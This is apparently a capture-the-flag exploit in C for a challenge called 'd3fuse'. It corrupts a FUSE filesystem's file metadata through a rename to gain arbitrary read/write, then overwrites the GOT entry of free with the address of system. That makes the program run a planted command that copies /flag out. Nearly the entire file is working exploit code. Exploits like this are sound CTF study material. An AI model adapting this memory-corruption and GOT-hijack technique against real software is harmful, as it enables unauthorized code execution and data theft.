// exploition for d3fuse
// by @eastXueLian
// compiled with: musl-gcc -w -static -o exp.bin exp.c

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

struct file_struct {
    char name[0x20];
    int file_type;
    int file_size;
    char *cont_ptr;
};

int main() {
    char buf[0x200];
    struct file_struct fake_file;
    
    // prepare shellcode
    system("echo \"cp /flag /chroot/rwdir\" > /mnt/cmd");

    // corrupted file
    int corrupted_fd = open("/mnt/corrupted_file", O_RDWR|O_CREAT, 0777);

    // construct fake file
    strcpy(fake_file.name, "fake_file");
    fake_file.file_type = 0;        // file
    fake_file.file_size = 0x200;
    fake_file.cont_ptr = 0x405018;       // elf.got['free']
    
    // write fake data into the data of corrupted_fd
    memcpy(buf, &fake_file, sizeof(struct file_struct));
    memcpy(buf + sizeof(struct file_struct), &fake_file, sizeof(struct file_struct));
    write(corrupted_fd, &fake_file, 2 * sizeof(struct file_struct));
    close(corrupted_fd);

    // trigger vulnablities
    system("mv /mnt/corrupted_file /mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1");
    sleep(1);

    // now we have arbitary read/write
    int rw_fd = open("/mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1/fake_file", O_RDWR, 0777);
    printf("%d\n", rw_fd);
    read(rw_fd, buf, 8);
    size_t system_addr = ((size_t*)buf)[0]-0x48440;
	((size_t *)buf)[0] = system_addr;
    printf("%llx\n", system_addr);

    // open it again to write
    rw_fd = open("/mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1/fake_file", O_RDWR, 0777);
    write(rw_fd, buf, 8);

    sleep(1);
    
    // call free
    system("mv /mnt/cmd /mnt/anotherfile");

    return 0;
}

